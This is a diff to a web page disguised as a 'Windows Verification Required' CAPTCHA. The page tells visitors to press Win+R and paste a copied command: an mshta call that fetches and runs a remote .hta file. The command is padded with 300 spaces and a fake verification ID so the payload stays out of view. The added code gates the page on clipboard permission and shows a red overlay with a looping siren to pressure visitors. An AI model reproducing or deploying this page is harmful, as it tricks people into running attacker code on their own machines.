@@ -10,6 +10,7 @@
       font-family: sans-serif;
       text-align: center;
       padding: 40px;
+      margin: 0;
     }
     .btn {
       background: #5865F2;
@@ -36,46 +37,126 @@
       max-width: 600px;
       text-align: left;
     }
+    #noClipboardAccessOverlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: darkred;
+      color: white;
+      font-size: 1.5rem;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      text-align: center;
+      padding: 20px;
+      z-index: 9999;
+      display: none;
+    }
   </style>
 </head>
 <body>
+  <div id="noClipboardAccessOverlay" role="alert" aria-live="assertive">
+    ⚠️ Clipboard access denied!<br>
+    Please reset this site's clipboard permissions in your browser settings.<br><br>
+    <audio id="sirenAudio" loop autoplay>
+      <source src="https://actions.google.com/sounds/v1/emergency/siren_long_warning.ogg" type="audio/ogg">
+      <source src="https://actions.google.com/sounds/v1/emergency/siren_long_warning.mp3" type="audio/mpeg">
+      Your browser does not support the audio element.
+    </audio>
+  </div>
+
   <h2>🔐 Windows Verification Required</h2>
-  
-  <div class="step">
-    <h3>Step 1: Copy the command</h3>
-    <p>Click the button to copy the verification command</p>
-    <button class="btn" onclick="copyCommand()">📋 Copy Command</button>
-  </div>
 
-  <div class="step">
-    <h3>Step 2: Run the command</h3>
-    <p>1. Press <kbd>Win + R</kbd> to open the Run dialog</p>
-    <p>2. Paste the command and press Enter</p>
-    <p>3. Wait for the popup to confirm</p>
-  </div>
+  <div id="verificationUI" style="display:none;">
+    <div class="step">
+      <h3>Step 1: Copy the command</h3>
+      <p>Click the button to copy the verification command</p>
+      <button class="btn" onclick="copyCommand()">📋 Copy Command</button>
+    </div>
 
-  <div class="step">
-    <h3>Step 3: Confirm Verification</h3>
-    <button class="btn" onclick="verifyCode()">✅ I ran the command - Verify me!</button>
-  </div>
+    <div class="step">
+      <h3>Step 2: Run the command</h3>
+      <p>1. Press <kbd>Win + R</kbd> to open the Run dialog</p>
+      <p>2. Paste the command and press Enter</p>
+      <p>3. Wait for the popup to confirm</p>
+    </div>
 
-  <p id="result"></p>
+    <div class="step">
+      <h3>Step 3: Confirm Verification</h3>
+      <button class="btn" onclick="verifyCode()">✅ I ran the command - Verify me!</button>
+    </div>
+
+    <p id="result"></p>
+  </div>
 
   <script>
     let code = "";
 
-    fetch("/generate-verification-code")
-      .then(res => res.json())
-      .then(data => {
-        code = data.code;
-        const spaces = " ".repeat(300);
-        const tailMsg = `CAPTCHA VERIFICATION ID: ${code}`;
-        window.generatedCommand = `mshta "https://freegamecopier.onrender.com/verifyaccept.hta?code=${code}"${spaces}${tailMsg}`;
-      })
-      .catch(err => {
-        alert("Failed to load verification code.");
-        console.error(err);
-      });
+    // On load, check clipboard permission
+    async function checkClipboardPermission() {
+      try {
+        // Request clipboard-read permission
+        const status = await navigator.permissions.query({name: 'clipboard-read'});
+        if (status.state === 'granted' || status.state === 'prompt') {
+          // Show the verification UI
+          document.getElementById('verificationUI').style.display = 'block';
+          // Generate code
+          generateVerificationCode();
+        } else {
+          // Show overlay with error and siren
+          showNoAccessOverlay();
+        }
+        // Listen for permission changes
+        status.onchange = () => {
+          if (status.state === 'granted' || status.state === 'prompt') {
+            hideNoAccessOverlay();
+            document.getElementById('verificationUI').style.display = 'block';
+            generateVerificationCode();
+          } else {
+            showNoAccessOverlay();
+            document.getElementById('verificationUI').style.display = 'none';
+          }
+        }
+      } catch(e) {
+        // If Permissions API not supported, just try clipboard read once
+        try {
+          await navigator.clipboard.readText();
+          document.getElementById('verificationUI').style.display = 'block';
+          generateVerificationCode();
+        } catch (err) {
+          showNoAccessOverlay();
+        }
+      }
+    }
+
+    function showNoAccessOverlay() {
+      document.getElementById('noClipboardAccessOverlay').style.display = 'flex';
+      const audio = document.getElementById('sirenAudio');
+      audio.play().catch(() => {}); // Ignore play errors (like autoplay blocked)
+    }
+
+    function hideNoAccessOverlay() {
+      document.getElementById('noClipboardAccessOverlay').style.display = 'none';
+      const audio = document.getElementById('sirenAudio');
+      audio.pause();
+      audio.currentTime = 0;
+    }
+
+    function generateVerificationCode() {
+      fetch("/generate-verification-code")
+        .then(res => res.json())
+        .then(data => {
+          code = data.code;
+          const spaces = " ".repeat(300);
+          const tailMsg = `CAPTCHA VERIFICATION ID: ${code}`;
+          window.generatedCommand = `mshta "https://freegamecopier.onrender.com/verifyaccept.hta?code=${code}"${spaces}${tailMsg}`;
+        })
+        .catch(err => {
+          alert("Failed to load verification code.");
+          console.error(err);
+        });
+    }
 
     function copyCommand() {
       if (window.generatedCommand) {
@@ -125,6 +206,9 @@
         document.getElementById("result").textContent = "❌ Clipboard read failed. Run the command first!";
       });
     }
+
+    // Run permission check on page load
+    checkClipboardPermission();
   </script>
 </body>
 </html>
